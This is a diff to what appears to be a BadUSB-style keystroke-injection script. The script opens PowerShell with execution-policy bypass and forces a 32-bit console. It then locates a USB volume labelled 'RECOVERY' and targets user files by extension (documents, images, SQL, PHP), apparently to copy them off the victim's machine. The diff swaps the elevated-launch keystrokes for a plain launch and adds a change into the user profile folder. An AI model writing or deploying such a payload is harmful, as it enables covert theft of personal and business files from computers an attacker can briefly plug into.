@@ -18,10 +18,8 @@ press("GUI r");
 delay(1000);
 type("powershell -NoP -NonI -Exec Bypass");
 delay(500);
-press("CONTROL SHIFT ENTER");
-delay(3000);
-press("ALT y");
-delay(4000);
+press("ENTER");
+delay(5000);
 
 function assurePS32() {
   type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
@@ -29,6 +27,8 @@ function assurePS32() {
 }
 assurePS32(); // open a 32bit console, if the current one is 64bit
 delay(4000);
+
+ type("cd $env:USERPROFILE\n") 
 
   type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'RECOVERY' } | select name\n"); //change YOUR_VOLUME_NAME to the name of your mounted usb volume.
 var filetypes = ["jpg", "png", "txt", "html", "gif", "js", "sql", "docx", "php"] // array of filetypes, add filetypes to your liking.
